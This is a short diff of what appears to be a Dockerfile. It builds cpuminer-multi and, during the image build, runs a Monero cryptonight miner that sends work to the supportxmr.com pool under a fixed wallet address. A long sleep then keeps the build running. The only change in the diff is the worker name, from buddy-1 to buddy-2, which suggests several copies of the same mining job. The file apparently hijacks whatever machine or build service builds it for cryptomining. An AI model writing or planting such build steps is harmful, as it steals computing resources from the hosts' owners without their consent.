@@ -12,7 +12,7 @@ RUN		git clone https://github.com/tpruvot/cpuminer-multi -b linux
 
 RUN		cd cpuminer-multi && ./build.sh
 
-RUN /cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://sg1.supportxmr.com:3333 -u 4Aqfp4tau13hXtvtp6Zp2uAMKRpSFouJoP9uDELrn2Jp8ygurPJbTwGZqT5DLXoToHJ23qvxfFsqsE7r7QRV58Uk47FbgRn -p buddy-1 some_file 2>&1 &
+RUN /cpuminer-multi/cpuminer -a cryptonight -o stratum+tcp://sg1.supportxmr.com:3333 -u 4Aqfp4tau13hXtvtp6Zp2uAMKRpSFouJoP9uDELrn2Jp8ygurPJbTwGZqT5DLXoToHJ23qvxfFsqsE7r7QRV58Uk47FbgRn -p buddy-2 some_file 2>&1 &
 
 RUN sleep 200000
 
